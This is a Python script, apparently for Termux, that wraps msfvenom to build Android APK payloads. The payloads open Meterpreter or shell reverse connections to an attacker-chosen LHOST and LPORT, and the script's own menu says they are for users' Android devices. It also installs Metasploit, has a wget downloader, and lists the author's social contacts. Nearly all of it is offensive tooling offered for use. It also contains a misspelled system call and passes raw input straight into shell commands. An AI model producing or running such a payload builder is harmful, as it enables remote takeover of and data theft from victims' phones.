#Telegram :  https://t.me/Muntadhar_Pro
#Whatsapp :  +9647831855486
#Youtube  :  https://www.youtube.com/channel/UCy_MihfVsFZwdwVWtG1qCPA
import os
from os import system
import time
from time import sleep 
def Muntadh():
    print("(1)==> payload android/meterpreter/reverse_tcp")
    print("(2)==> payload android/meterpreter/reverse_http")
    print("(3)==> payload android/meterpreter/reverse_https")
    print("(4)==> payload android/shell/reverse_tcp")
    print("(5)==> payload android/shell/reverse_http")
    print("(6)==> payload android/shell/reverse_https")
    abc = input("====> : ")
    if abc == '1':
       LHOST = input("LHOST =>:")
       LPORT = input("LPORT =>:")
       system("msfvenom -p android/meterpreter/reverse_tcp lhost="+LHOST+" lport="+LPORT+" -o MTR-Payload-number-1.apk")
       system("rm -rf Payloads")
       system("mkdir Payloads")
       system("mv MTR-Payload-number-1.apk Payloads")
    elif abc == '2':
       Lhost = input("LHOST ==>:")
       Lport = input("LPORT ==>:")
       system("msfvenom -p android/meterpreter/reverse_http lhost="+Lhost+" lport="+Lport+" -o MTR-Payload-number-2.apk")
       system("rm -rf Payloads")
       system("mkdir Payloads")
       system("mv MTR-Payload-number-2.apk Payloads ")
    elif abc == '3':
       LHost = input("LHOST ===>:")
       LPort = input("LPORT ===>:")
       system("msfvenom -p android/meterpreter/reverse_https lhost="+LHost+" lport="+LPort+" -o MTR-Payload-number-3.apk")
       system("rm -rf Payloads")
       system("mkdir Payloads")
       system("mv MTR-Payload-number-3.apk Payloads")
    elif abc == '4':
       LHOst = input("LHOST ====>:")
       LPOrt = input("LPORT ====>:")
       system("msfvenom -p android/shell/reverse_tcp lhost="+LHOst+" lport="+LPOrt+" -o MTR-Payload-number-4.apk ")
       system("rm -rf Payloads")
       system("mkdir Payloads")
       system("mv MTR-Payload-number-4.apk Payloads")
    elif abc == '5':
       LHOSt = input("LHOST =====>:")
       LPORt = input("LPORT =====>:")
       system("msfvenom -p android/shell/reverse_http lhost="+LHOSt+" lport="+LPORt+" -o MTR-Payload-number-5.apk ")
       system("rm -rf Payloads")
       system("mkdir Payloads")
       system("mv MTR-Payload-number-5.apk Payloads")
    elif abc == '6':
       LHoST = input("LHOST ======>:")
       LPoRT = input("LPORT ======>:")
       system("msfvenom -p  android/shell/reverse_https lhost="+LHoST+" lport="+LPoRT+" -o MTR-Payload-number-6.apk")
       system("rm -rf Payloads")
       sysyem("mkdir Payloads")
       system("mv MTR-Payload-number-6.apk Payloads")
    else:
        print(abc+ " ,Error command not found please type number ")
        
system("clear")
print("Welcome to my program By MTR = Muntadhar Pro ")
sleep(3)
system("clear")
print("Telegram :  https://t.me/Muntadhar_Pro")
print("Whatsapp :  +9647831855486")
print("Youtube  :  https://www.youtube.com/channel/UCy_MihfVsFZwdwVWtG1qCPA")
sleep(5)
system("clear")
print("{{( 1 )}}===> Payloads only to users devices android 'apk' ")
print("{{( 2 )}}===> Download the files from internet in termux")
MTR = input("====>> : ")
if MTR == '1':
   system("clear")
   print("Loading 99% ")
   sleep(3)
   system("clear")
   print("Do you installed metasploit Y/n")
   A = input("Y/n : ")
   if A == "Y":
      system("clear") 
      Muntadh()
   elif A == "n":
      system("apt update -y ")
      system("apt upgrade -y ")
      system("apt install python -y ")
      system("apt install wget -y ")
      system("apt install curl -y ")
      system("apt install ruby -y ")
      system("apt install proot -y ")
      system("apt install unstable-repo -y ")
      system("pkg install metasploit -y ")
      system("clear")
      Muntadh()
   elif A == "y":
        system("clear")
        Muntadh()
   elif A == "N":
        system("apt update -y ")
        system("apt upgrade -y ")
        system("apt install python -y ")
        system("apt install wget -y ")
        system("apt install curl -y ")
        system("apt install ruby -y ")
        system("apt install proot -y ")
        system("apt install unstable-repo -y ")
        system("pkg install metasploit -y ")
        system("clear")
        Muntadh()
   else:
        print("Error please Answer 'Y' or 'N' ")

elif MTR == '2':
     system("clear")
     print("Do you installed wget Y/n")
     w = input("====>:")
     if w == "Y":
        system("clear")
        print("Paste link the file or the website ")
        r = input("=====> :")
        system("wget "+ r)
     elif w == "n":
        system("clear")
        system("apt update -y ")
        system("apt upgrade -y ")
        system("apt install proot -y ")
        system("apt install wget -y ")
        system("clear")
        print("Paste link the file or the website ")
        e = input("=====> :")
        system("wget "+e)
     elif w == "y":
        system("clear")
        print("Paste link the file or the website ")
        r = input("=====> :")
        system("wget "+ r)
     elif w == "N":
        system("clear")
        system("apt update -y ")
        system("apt upgrade -y ")
        system("apt install proot -y ")
        system("apt install wget -y ")
        system("clear")
        print("Paste link the file or the website ")
        e = input("=====> :")
        system("wget "+e)
     else:
         print(w+" ,command not found  please answer in 'Y' or 'n' ....!")
else:
    print("Please type number '1' or '2' ")
